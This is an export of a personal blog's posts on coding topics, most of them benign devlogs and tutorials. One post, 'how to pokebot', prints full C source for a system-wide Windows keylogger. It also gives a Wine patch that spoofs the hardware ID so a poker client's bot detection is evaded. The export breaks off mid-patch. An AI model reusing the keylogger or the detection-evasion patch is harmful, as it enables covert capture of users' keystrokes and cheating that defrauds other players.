ac{(y_2 - y_1) \\times x_0 - (x_2 - x_1) \\times y_0 + x_2 \\times y_1 - y_2 \\times x_1}{\\sqrt{(y_2-y_1)^2 + (x_2-x_1)^2}}\\bigr| $$\n\nHere is the result of a relaxed threshold that will draw a lot of lanes\n\n![](/img/58a3871f9072d.png)\n\nhere are the same results with a stricter threshold that has discarded the middle lane\n\n![](/img/58a387534357e.png)\n", "file": "galaxy-hyper-lane-generation.ipynb"}, {"title": "techscan devlog 2018-12-03", "body": "\nA new month a new dev log for the stuff that\u2019s been going on\n\nHuge change yet again for the engine which I will get into later. First order\nof business is a summary of the new stuff:\n\n## Summary\n\n1. get rid of all but USD pairings for cryptos\n2. reduce symbol listing response size from 1.2M to 0.8M\n3. new scanner: trend start\n4. S/R zones to charts\n5. using TaLib java API\n6. Candle stick patterns scanners\n7. port back over to java w/o spring + hibernate\n8. eclim, idea + X forward, Che adventures\n9. market overview calculations in SQL\n10. store technical calculations in KV store\n11. correlation calculations in technical calculations\n\n## Good bye pairings\n\nSome of the alt coins are worth so less that compared with BTC they end up\ntaking 8-9 decimal places. This is a disaster for the display and the layout of\nthe app in general. At first I had thought about displaying these types of\ncurrency pairs as satoshis but that was met with high resistance from my\nprevious team members. The pair name is XXX/BTC so you cannot display it in\nSatoshi\u2019s was the justification. Fair enough I guess. Another fix for this\ncould be decreasing the font size if there are a lot of decimal places, but I\nhave tried this. It sounds like it should work in theory but I\u2019d have to\nexperiment with it to be convinced that it does. So for the time being the\neasiest solution is to drop pairings with BTC and keep only the pairs that are\ntraded against the USD. All of the big coins are included in this so no big\nloss their.\n\n## Slim responses\n\nThe autocomplete component of Vuetify requires a list of the items to complete\n(though I\u2019m pretty sure their should be a version that can do partial searches\nwith AJAX) and that list in the previous version was huge around 1.2 megabytes.\nThe initial delay after the autocomplete trigger was around 2 seconds which\nmade it appear to be not responding. My primary solution to this was to trigger\na request to the symbol listing endpoint after the app loaded in the background\nand since requests are cached the searches would not have that initial lag.\nThis worked out like I thought but the payload size is still more than I cared\nfor so I got rid of some of the fields in the response and change the structure\nfrom a JSON object to an array dropping the keys and therefore reducing the\nsize even further.\n\n## More scanners\n\nA saw a scanner on STB that I wanted to incorporate as I think it\u2019s important:\nThe new trend started scanner. It fires when the ADX crosses the 25 line. Even\nthough ADX lags it\u2019s still useful to know that a trend has begun.\n\n## More charts\n\nData visualizations are always cool, you can never get enough of them. This\nmotivated me to add a chart displaying the support and resistance zones\ncalculated using the clustering method I blogged about a couple of weeks back.\n\n![](/img/ts2.png)\n\nI plan on adding charts to each triggered scan with the relevant indicators\nlike MA\u2019s for MA crossovers etc. But it\u2019s a low priority task right now.\n\n## New technical analysis library\n\nTa-lib.org is a mature technical analysis library that supports way more\nindicators that I built into talib4j. I was quite happy with the results I got\nwhen\n\nusing the python wrapper so it\u2019s back in. I plan on doing a write up on the\nperformance vs talib4j as the code is probably transpiled from the C version\nand impossible to read. The Java API is god awful because of this generated\ncode, which means the C API is just as disgusting. To limit the exposure to\nthis filth I wrapper the API with a custom class and I can just substitute that\nfor talib4j any time if I have all the indicators coded in.\n\n## Even more scanners\n\nUsing Talib also gives me access to candle pattern recognition. I didn\u2019t want\nto write a scanner for each of the patterns so I had to resort to using the\njava reflection API to figure out the correct method to call from the scan\ndefinition file. So the definition file is something like this:\n\n``` { \u201cid\u201d: \u201c\u2026\u201d \u201cname\u201d: \u201csome scanner\u201d: \u201cmodule\u201d: \u201cCDL2CROWS\u201d } ```\n\nI had all the definitions generated from the documentation on the talib site\nwith a small python script (around 60 different scans) and look up the method\nfrom the module attribute of the definition. With the addition of all the\ncandle patterns each run consists now of around 16K scans!\n\n## Back to the drawing board\n\nNow that I am running 16K scans the python code took 48 hours to complete a\ndays worth of scans. This of course is unacceptable as the scans need to be\ndone quickly. It\u2019s no use to display scans 2 days after the market closes. I\npoked around with multi threading in the python code but to no avail as there\nis this thing called the \u201cGlobal Interpreter Lock\u201d which limits you to the\ntotal performance of a single core. Also using multi threaded code consume too\nmuch memory \u2013 something which I will not have that much of in production. So\nback to a faster language: Java. But this time I didn\u2019t want all the bloat that\ncomes with spring + hibernate. They consume way too much memory that was one of\nthe reasons for going with python. So this time around it\u2019s a plain old Java\napplication with small utility libraries for database operations. Now 16K scans\ntake 1 hour to complete without multi threaded code. I was initially thinking\nof keeping the python engine for other stuff like synchronization, and\ntechnical calculations etc. but ended up porting all the engine code back to\nJava.\n\n## Have Chromebook will code\n\nI got a new toy from the Black Friday sales events so naturally I want to use\nit all the time. But it\u2019s not buffed in terms of hardware so I needed to find a\nway of coding Java without running a full blown IDE on my Chromebook. It would\nprobably run the IDE OK but the engine + database would put to much strain and\nit would start to crawl. So I started coding in Emacs. Plain old Emacs with no\npackages. It sounds crazy and it actually is quite crazy. It was nice just\nsuspending the machine and reattaching the session to continue where I left\noff, but no syntax checking, not auto imports makes it a hassle. Not being able\nto see the parameters of a method call was the worst. So I checked out what\npackages people were using for coding on Emacs. The most effective one seemed\nto be Eclim. I had used Eclim before with vim (which is the original purpose of\nEclim: Eclipse + vim) but somebody had wrote a wrapper around the binary for\nEmacs. I tried to get it running on my Debian development server but I could\nnot get it to work. It would just not connect. So I gave up on Eclim and\nchecked out another package called Megahanada. Found that one too complicated\nand didn\u2019t really find the functions it provided useful. Then I tried X\nforwarding with Intellij Idea. This felt like home a familiarity that was much\nappreciated. This lasted for a week or 2 until the inefficient X protocol drove\nme nuts with the stupid lagging of the UI. I looked around for some\nalternatives and came across xpra which was supposed to be faster but really\nwasn\u2019t. And the fonts and graphics were blurry with Xpra so it went out the\nwindow. I thought that maybe it was Swing that wasn\u2019t playing nicely so I tried\nX forwarding with VS Code. Same problems. But on a side note I really liked the\nJava plugin for VS Code \u2013 it\u2019s lightweight and provides all the great\nfunctionality that I was searching for. Anyways then I remembered Eclipse Che \u2013\nA web based IDE. I had tried Che before in it\u2019s early stages and wasn\u2019t really\nimpressed with it\u2019s current state. But know they\u2019ve created a Docker image\nwhich is super easy to install and get running and they\u2019ve also added Git\nsupport so worst I could use Che to write the code push and compile/test on my\ndevelopment server. But Che workspaces already come with Java + Maven so I\ncould basically do everything I wanted in the Che environment. Another bad\nthing with X Forwarding was that once the laptop suspended the SSH connection\nwas lost and the applications died on me. Since I have leave the computer to do\nother stuff (like burping, diaper changes, etc) this was bugging me quite a\nbit. Now in Che the tab remains open and I can continue where I left off\nwithout a problem.\n\n## Bugs bugs bugs\n\nPorting over code is also a great chance to check what I\u2019ve actually written. I\nfigured out major bugs in the technical calculations code which I fixed. I was\ndoing all of these calculations in application code, which is probably slower\nthan doing them on the DB side so I moved the things I could calculate on the\nDB over there.\n\n## few architectural changes\n\nI was letting the API calculate some of the data on the symbol detail view on\nthe fly, but now I decided to have these pre-calculated for the last trade date\nand store them in the key/value store. I really wan\u2019t refrain from having the\nAPI do calculations to consolidate all the logic on the engine code base. This\nmeant moving the technical and overview tab data to the key/value store. I also\nwanted to merge these to requests as they did have a couple of overlapping\nvalues. I also decided to store the correlation data in the key/value store as\nit was taking up a lot of rows in the table. I was keeping a history of the\ncorrelated items which is probably not necessary. While at it I also removed\nthe dedicated job for correlated calculations and merged it into the technical\ncalculations.\n\nWow that was quite a long post \u2013 a lot has happened in the past week.\n", "file": "techscan_devlog_2018-12-03.ipynb"}, {"title": "ittb devlog 2018-04-19", "body": "test playing the new turn based tower defense game which I have not yet dubbed\nand shall refer to as TBTD for short I came to the conclusion that levels were\ntoo easy. Adding more enemies is the first thing that popped into my mind but\nthat doesn\u2019t make the game interesting, it only makes it tedious. In the first\nround of the prototype I had the targeting set to all neighbor tile at a\ndistance of 1 tile.\n\nSo diagonal attacks were possible. Changing this rule to only cardinal\ndirections increased the difficulty quite a bit. Also I came up with the\nfollowing mechanic: The player has 2 types of attacks. Ranged and melee. If you\nare standing next to an enemy you default to a melee attack.\n\nYou cannot use a ranged attack. If you are not next to the enemy it\u2019s a ranged\nweapon attack (if you have one). Since ranged attack will not displace the\nenemy it becomes a tactical decision to use a ranged attack and keep you Mech\nsafe or go up to the enemy to displace it. This did add a variety to the\ntactical decision needed. GO refactored the attack code into a weapons class,\nso we have the foundation to add different types of weapons into the game.\n\nThe pilot weapons are the Punch and Auto-cannon with different damages /\nranges. \n\nAs the turns progress new enemies spawn. The current method for doing this is a\nprobabilistic method and the chances to spawn an enemy increase with each turn\nthat an enemy is not spawn. If an enemy does spawn, the chance reduces. So if\nthe game drags on your chances of clearing the level decrease quite a bit which\nforces the player to act quickly. I\u2019m also thinking of adding a turn counter to\nmake some levels survival mode levels.  \n\nOne feedback I got was that the levels become repetitive after a certain while,\nespecially if there is going to be the concept of permanent death, which I\nactually find appealing. Random level generation is out of the question as\nrandom is random, and not nice to play. So going through some procedural level\ncontent designs, I came up with the idea of constructing the levels in chunks.\nEach level consists of a combination of 4 chunks to choose from N. \n\nThis can yield different level topology and game play. We\u2019ll need to test this\nto see how it goes. \n\nWe discussed the concept of salvaging enemies at the end of each level\n(looting) for better weapons and upgrades. This also looks like a promising\nmechanic.  \n\nFor this to be meaningful, I will also need to implement some kind of\nprocedural weapon generator which I need look into.\n", "file": "ittb_devlog-2018-04-19.ipynb"}, {"title": "chained ajax calls", "body": "\nSometimes you want to make successive calls to multiple urls one after another - not in parallel. With the programming model for javascript using callbacks this can be a bit confusing to implement properly. Here is a neat trick to do it.\nsay you have a list of urls [url1, url2, url3] if you could transform this list to\n\n```\n[\n  function() {\n    XHR.send();\n    XHR.onload = next_fn_in_list\n  },\n  function() {\n    XHR.send();\n    XHR.onload = next_fn_in_list\n  }, ...\n]\n```\n\nyou actually dont even need this be a list, because the onload will reference the next function to call. This is exactly what reduce does for arrays.\n\n\n```\nvar chainedAjaxCalls = myList.reduceRight(function(previousValue, currentValue) {\n        return function() {\n            var xhr = new XMLHttpRequest();\n            xhr.onload = previousValue;\n            xhr.open(\"GET\", 'http://url?param=' + currentValue);\n            xhr.send()\n        }\n    }, function() {});\n    chainedAjaxCalls();\n\n```\n\nwe iterate over the array with the initial NOP function, and return a function that sets the onload to the previous function. We start from the right so the last requests onload is the nop. then n-1 functions onload is n, etc. \nthis will create a chain of ajax calls for the url list.\nvery nice.\n", "file": "chained-ajax-calls.ipynb"}, {"title": "join5", "body": "\nJoin5 is my first game with the godot engine. I did the logic programming (path finding, undo, joker supported ball destroys, etc) and a friend of mine did the graphics and GUI related programming. The game is a match-N type of game similar but a bit different than the old game I used to play on Gnome called \"the same game\". \n\nThe development including the GFX and SFX took about a month to complete working on average 3hrs/day on this. It did look like a superficial and simple game to implement but interesting cases did appear after we decided to add a joker colored ball. \n\nYou can download it [here](https://play.google.com/store/apps/details?id=org.godotengine.join5)\n\n![image join 5](/img/conn5.png)\n", "file": "join5.ipynb"}, {"title": "bitchx uzerinden im", "body": "\nKonsol kullanmanin zevki bir baskadir.. Insani nedense bir tribe sokar? Benim konsol ve konsolda calisan programlari sevmemin nedeni, mouse kullanmadan, klavyeden hizlica islemlerin yapilmasidir. Cunku mouse kullanmak icin elimi klavyeden kaldirmam demek, 0.5 sn mouse gidis, 0.5 sn mouse pointerini istedigim yere getirmem, 0.5 sn tekrar klavyeye donus, 0.5 saniye klavyeye yerlesme, yani 2 sn kayip demek.Ayrica ekstradan getirdigi ritm bozuklugunuda eklemek gerekli. Neyse bu amacla konsol uzerinden calisabilecek bir IM istemcisi aramaya koyuldum. EKG2 gayet artiz bir ara yuze sahip, yetenekli bir istemci gibi gorunuyordu, biraz kurcaladim, ama inanilmaz bir dokuman, daha dogrusu ingilizce dokuman eksikligi var. Polonyaca (herhalde boyle deniliyor) dokumanlari cozmeye calismaktan imanim gevredi, en sonundada pes ettim. Licq ve arkadaslari gibi bir cok yetenkli program buldum , ama istedigim ara yuze sahip degillerdi. Benim aklimdaki (EKG2de de olan) bitchX tarzi bir arayuzdu. Daha sonra BitchX uzerinden (aslinda herhangi bir IRC istemcisi uzerinden) MSN, Jabber, vs. protokollere baglanmayi sagalayan BitlBee diye bir daemon programina rastladim. Mantik gayet basit ve $ikti. IRC sunucusu gibi davranan bu program, arkada belirtilen IM protokoluna bagalaniyor, ve mesajlari forwardliyor. Kanal Listesinde ise IM programindaki rosteriniz da gorununen kisiler gorunuyor. Artik BitchX le IM yapabiliyorum.\n", "file": "bitchx_im.ipynb"}, {"title": "how to pokebot", "body": "\n_This a historic document that I found somewhere on my hard drive. It's incomplete\nand the quality is very poor at best_\n\n## The devil: win32 API\nTo capture the messages from the window of the poker client, had to be done with win api stuff. The other options that come to mind are:\n\n* decrypt the network traffic between the poker room client and server, which is probably impossible\n* screen scrape the poker room client, which i think is a bad idea and hard to implement error prone etc.\n\nSo we need to hook various api functions, ExtTextout, DrawText, etc. Tutorial about this stuff on the web are quite scarce, after quite a while of searching i came up with two simple code examples:\n\n\nhookdll.c:\n\n```\n#include <windows.h>\n#include <string.h>\n#include <stdio.h>\n\n#pragma data_seg(\"hookdata\")\nHHOOK oldkeyhook = 0;\n#pragma data_seg()\n#pragma comment(linker, \"/SECTION:hookdata,RWS\")\n\n#define DllExport\u00a0 __declspec (dllexport)\n\nDllExport LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);\nDllExport void InstallHook(int nCode);\nDllExport void EndHook();\n\nHINSTANCE hInst = NULL;\n\nBOOL APIENTRY DllMain(HINSTANCE hInstance,DWORD\u00a0 ul_reason_for_call,LPVOID lpReserved)\n{\n\u00a0\u00a0\u00a0 switch(ul_reason_for_call)\n\u00a0\u00a0\u00a0 {\n\u00a0\u00a0\u00a0 case DLL_PROCESS_ATTACH:\n\u00a0\t\u00a0\u00a0 hInst = hInstance;\n\u00a0\t\u00a0\u00a0 break;\n\u00a0\u00a0\u00a0 case DLL_PROCESS_DETACH:\n\u00a0\t\u00a0\u00a0 break;\n\u00a0\u00a0\u00a0 case DLL_THREAD_ATTACH:\n\u00a0\t\u00a0\u00a0 break;\n\u00a0\u00a0\u00a0 case DLL_THREAD_DETACH:\n\u00a0\t\u00a0\u00a0 break;\n\u00a0\u00a0\u00a0 }\n\u00a0\u00a0\u00a0 return TRUE;\n}\n\nvoid InstallHook(int nCode)\n{\n\u00a0\u00a0\u00a0 oldkeyhook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, hInst, 0);\n}\n\nDllExport LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wp, LPARAM lp)\n{\n\u00a0\u00a0\u00a0 FILE *fp;\n\u00a0\u00a0\u00a0 if (nCode >= 0)\n\u00a0\u00a0\u00a0 {\u00a0\t\u00a0\u00a0\n\u00a0\t\u00a0\u00a0 if ((lp & 0x80000000) == 0x80000000)\n\u00a0\t\u00a0\u00a0 {\n\u00a0\t\t\u00a0\u00a0 fp = fopen(\"C:\\\\keys.txt\",\"a+\");\n\u00a0\t\t\u00a0\u00a0 char lpszName[0x100] = {0};\n\u00a0\t\t\u00a0\u00a0 GetKeyNameText(lp,lpszName,0xFF);\n\u00a0\t\t\u00a0\u00a0 fwrite(lpszName,strlen(lpszName),1, fp);\n\u00a0\t\t\u00a0\u00a0 fclose(fp);\u00a0\t\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 }\u00a0\u00a0\u00a0\n\u00a0\u00a0 }\n\u00a0\u00a0 return CallNextHookEx(oldkeyhook,nCode,wp,lp);\n}\nvoid EndHook(void)\n{\n\u00a0\u00a0\u00a0 UnhookWindowsHookEx(oldkeyhook);\n}\n```\n\nhookexe.c:\n\n```\n#include <windows.h>\n\nLRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);\nchar szClassName[ ] = \"mTn\";\n\nint WINAPI WinMain (HINSTANCE hThisInstance,\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 HINSTANCE hPrevInstance,\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 LPSTR lpszArgument,\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 int nFunsterStil)\n\n{\n\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 MSG messages;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 WNDCLASSEX wincl;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 HWND hwnd;\u00a0\n\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 wincl.hInstance = hThisInstance;\n\u00a0\u00a0\u00a0 wincl.lpszClassName = szClassName;\n\u00a0\u00a0\u00a0 wincl.lpfnWndProc = WindowProcedure;\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 wincl.style = CS_DBLCLKS;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 wincl.cbSize = sizeof (WNDCLASSEX);\n\n\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);\n\u00a0\u00a0\u00a0 wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);\n\u00a0\u00a0\u00a0 wincl.hCursor = LoadCursor (NULL, IDC_ARROW);\n\u00a0\u00a0\u00a0 wincl.lpszMenuName = NULL;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 wincl.cbClsExtra = 0;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 wincl.cbWndExtra = 0;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;\n\n\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 if (!RegisterClassEx (&wincl))\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return 0;\n\n\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 hwnd = CreateWindowEx (\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 0,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 szClassName,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \"mTn keyb hook\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 WS_OVERLAPPEDWINDOW,\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 CW_USEDEFAULT,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 CW_USEDEFAULT,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 190,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 58,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 HWND_DESKTOP,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 NULL,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 hThisInstance,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 NULL\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 );\n\n\u00a0\u00a0\u00a0 ShowWindow (hwnd, nFunsterStil);\n\n\u00a0\u00a0\u00a0 while (GetMessage (&messages, NULL, 0, 0))\n\u00a0\u00a0\u00a0 {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 TranslateMessage(&messages);\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 DispatchMessage(&messages);\n\u00a0\u00a0\u00a0 }\n\u00a0\u00a0\u00a0 return (int)messages.wParam;\n}\n\nLRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)\n{\n\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 HWND hButton;\n\u00a0\u00a0\u00a0 HWND hButton1;\n\u00a0\u00a0\u00a0 static HMODULE hInsDll;\n\u00a0\u00a0\u00a0 HFONT hfDefault;\n\u00a0\u00a0\u00a0 void (*pInstallHook)(int);\n\u00a0\u00a0\u00a0 void (*pUninstallHook)(void);\n\u00a0\u00a0\u00a0 switch (message)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0 {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\t\u00a0\u00a0 case WM_DESTROY:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 PostQuitMessage (0);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 break;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 case WM_CREATE:\n\u00a0\t\t\u00a0\u00a0 hfDefault = (HFONT)GetStockObject(DEFAULT_GUI_FONT);//Sistem fontunu al\u00fdr\n\u00a0\t\t\u00a0\u00a0 hButton =\u00a0 CreateWindow(\"button\",\"HOOK ET\",WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_TABSTOP,0,0,80,24,hwnd,(HMENU)1001,((LPCREATESTRUCT)(lParam))->hInstance,NULL);\n\u00a0\t\t\u00a0\u00a0 SendMessage(hButton, WM_SETFONT, (WPARAM)hfDefault, MAKELPARAM(FALSE, 0)); //sistem fontunu kulland\u00fdr\u00fdr\n\u00a0\t\t\u00a0\u00a0 hButton1 =\u00a0 CreateWindow(\"button\",\"BIRAK\",WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_TABSTOP,90,0,90,24,hwnd,(HMENU)1002,((LPCREATESTRUCT)(lParam))->hInstance,NULL);\n\u00a0\t\t\u00a0\u00a0 SendMessage(hButton1, WM_SETFONT, (WPARAM)hfDefault, MAKELPARAM(FALSE, 0)); //sistem fontunu kulland\u00fdr\u00fdr\n\u00a0\t\t\u00a0\u00a0 hInsDll = LoadLibrary(\"kbHookDll.dll\");\n\u00a0\t\t\u00a0\u00a0 break;\n\u00a0\t\u00a0\u00a0 case WM_COMMAND:\n\u00a0\t\t\u00a0\u00a0 switch(LOWORD(wParam))\n\u00a0\t\t\u00a0\u00a0 {\n\u00a0\t\t\t\u00a0\u00a0 case 1001:\n\u00a0\t\t\t\t\u00a0\u00a0 pInstallHook = (void (*)(int))GetProcAddress(hInsDll, \"InstallHook\");\n\u00a0\t\t\t\t\u00a0\u00a0 pInstallHook(TRUE);\n\u00a0\t\t\t\t\u00a0\u00a0 break;\n\n\u00a0\t\t\t\u00a0\u00a0 case 1002:\n\u00a0\t\t\t\t\u00a0\u00a0 pUninstallHook = (void(*)(void))GetProcAddress(hInsDll,\"EndHook\");\n\u00a0\t\t\t\t\u00a0\u00a0 pUninstallHook();\n\u00a0\t\t\t\t\u00a0\u00a0 break;\n\u00a0\t\t\u00a0\u00a0 }\n\u00a0\t\t\u00a0\u00a0 break;\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 default:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return DefWindowProc (hwnd, message, wParam, lParam);\n\u00a0\u00a0\u00a0 }\n\u00a0\u00a0\u00a0 return 0;\n}\n```\n\n\nThe exe file injects a system wide hook dll that intercepts the keyboard keypress api call and logs the key pressed into a file. A very simple key-logger if you will. The codes logic is pretty simple i think, you just reroute the original api call to yours, do the stuff you want and then call the original api method. The method used here is a method provided by the windows api, so there is nothing illegitimate with the method. But thebad news is that this type of hooking is only supported for hooking messages between windows and not gdi32 api calls, which we need. So we can't use this method on a poker room client, that disguises its log text\n\n\n## Trying it Under Wine\n\nAfter failed attemps on win32 API programming I came up with the ingenious idea of running the poker desktop clients on linux, under the wine win32 API emulator.\u00a0 We had a discussion about the pro/cons of this approach.\nPros:\n* wine is open source, so easy access to the API implementation to override custom windows stealth behaviours.\n* No need to avoid poker room clients detection attempts, everything is in the wine source code\nLinux environment\n\nCons:\n* Probably no source code to examine, need to hack wine codes by ourselves\n* User input simulation still remains a mystery\n\n\nInstalling wine under debian etch, was quite easy. I just grabbed the source from the sourceforge page and untarred it. The configure script keeps bugging you for the dependencies, which where lib-png, lib-jpeg, flex, bison, libxml2 for me,on a minimal desktop installation of debian. The build time takes quite a while, ~1,5 million lines of code, but completes without errors.\nNext up, download the pokerroom executable from their page, and run it under wine. Wine complained about missing DLLs such as mfc 4.2 and visual C runtime files. To satisfy this hunger we used winetricks from http://www.kegel.com/winetricks which is a small script that downloads and install the dependecy DLLs.\nWhen you fire up wine, the poker room client executes complaining about some DLL being old, which is not important. After you try to login, it says that it can't connect to the login server. This is because wine hardware ID's are blacklisted. To overcome this, you need to patch wine to report a different hardware id. Here is the patch for version 0.9.30:\n\n\n```\ndiff -uNr wine-0.9.30-fe/dlls/advapi32/advapi.c wine-0.9.30-fe-patched/dlls/advapi32/advapi.c\n--- wine-0.9.30-fe/dlls/advapi32/advapi.c\t2007-01-25 07:53:50.000000000 -0800\n+++ wine-0.9.30-fe-patched/dlls/advapi32/advapi.c\t2007-02-22 16:50:15.000000000 -0800\n@@ -112,11 +112,57 @@\n*/\nBOOL WINAPI GetCurrentHwProfileA(LPHW_PROFILE_INFOA pInfo)\n{\n-\tFIXME(\"(%p) semi-stub\\n\", pInfo);\n-\tpInfo->dwDockInfo = DOCKINFO_DOCKED;\n-\tstrcpy(pInfo->szHwProfileGuid,\"{12340001-1234-1234-1234-1233456789012}\");\n-\tstrcpy(pInfo->szHwProfileName,\"Wine Profile\");\n-\treturn 1;\n+       CHAR profile[32];\n+       DWORD type;\n+       DWORD size;\n+       DWORD ret;\n+       DWORD val;\n+       HKEY hkey;\n+       BOOL profile_result = 0;\n+\n+       ret = RegOpenKeyA(HKEY_LOCAL_MACHINE, \"System\\\\CurrentControlSet\\\\Control\\\\IDConfigDB\",\n+                         &hkey);\n+\n+       if (ret != ERROR_SUCCESS)\n+               goto profile_error;\n+\n+       ret = RegGetValueA(hkey, NULL, \"CurrentConfig\", RRF_RT_DWORD,\n+                          &type, &val, &size);\n+       if (ret != ERROR_SUCCESS || size != 4 || type != REG_DWORD)\n+               goto profile_error;\n+\n+       /* At least, I think the profile names are hex */\n+       sprintf(profile, \"Hardware Profiles\\\\%04x\", (WORD)(val & 0xffff));\n+\n+       /* Set the profile name */\n+       size = MAX_PROFILE_LEN;\n+       ret = RegGetValueA(hkey, profile, \"FriendlyName\", RRF_RT_REG_SZ,\n+                          &type, pInfo->szHwProfileName, &size);\n+\n+       if (ret != ERROR_SUCCESS || type != REG_SZ)\n+               goto profile_error;\n+\n+       /* Now get the GUID of this profile */\n+       size = HW_PROFILE_GUIDLEN;\n+       ret = RegGetValueA(hkey, profile, \"HwProfileGuid\", RRF_RT_REG_SZ,\n+                          &type, pInfo->szHwProfileGuid, &size);\n+\n+       if (ret != 